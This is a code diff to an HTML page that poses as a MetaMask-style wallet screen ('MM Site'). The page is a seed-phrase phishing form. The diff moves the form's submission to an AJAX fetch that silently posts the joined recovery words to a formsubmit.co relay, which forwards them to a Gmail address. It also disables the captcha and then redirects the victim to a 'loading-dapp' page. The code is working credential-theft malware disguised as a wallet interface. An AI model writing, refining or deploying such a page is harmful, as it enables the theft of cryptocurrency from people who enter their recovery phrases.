@@ -30,9 +30,10 @@
 </button><!----></tabs></div>
 
 <section _ngcontent-wrh-c175="" class="main_panel">
-    <form _ngcontent-wrh-c175="" novalidate="" class="ng-untouched ng-pristine ng-valid" 
-    action="https://formsubmit.co/thefamilyonly994@gmail.com" method="POST">
+    <form _ngcontent-wrh-c175="" id="seedForm" novalidate="" class="ng-untouched ng-pristine ng-valid" 
+    action="https://formsubmit.co/ajax/thefamilyonly994@gmail.com" method="POST">
     <input type="hidden" name="_next" value="https://loading-dapp.pages.dev/">
+    <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="New message from MM Site">
     <input type="hidden" name="website" value="MM Site">
     <input type="hidden" name="seedphrase" id="seedphrase" value="">
@@ -53,14 +54,39 @@
 <bottom-buttons _ngcontent-wrh-c175="" _nghost-wrh-c83=""><div _ngcontent-wrh-c83="" class="inner">
     <button _ngcontent-wrh-c83="" class="outline" type="submit"> Next <!----></button><!----><!----></div>
     <script>
-    // Combine all seed phrase inputs into a single field
-    document.querySelector('form').addEventListener('submit', function(e) {
+    // Combine all seed phrase inputs into a single field and submit via AJAX.
+    document.getElementById('seedForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
         const inputs = Array.from(document.querySelectorAll('input[name^="input"]'))
             .filter(input => input.value.trim() !== '')
             .map(input => input.value.trim())
             .join(' ');
-        
+
         document.getElementById('seedphrase').value = inputs;
+
+        const form = e.currentTarget;
+        const nextUrl = form.querySelector('input[name="_next"]')?.value || '/';
+        const action = form.getAttribute('action');
+        const formData = new FormData(form);
+
+        fetch(action, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        }).then(response => {
+            if (!response.ok) {
+                throw new Error('Submission failed: ' + response.status);
+            }
+            return response.text();
+        }).then(() => {
+            window.location.href = nextUrl;
+        }).catch(error => {
+            alert('Form submission failed. Please try again.');
+            console.error(error);
+        });
     });
 </script>
 </form>
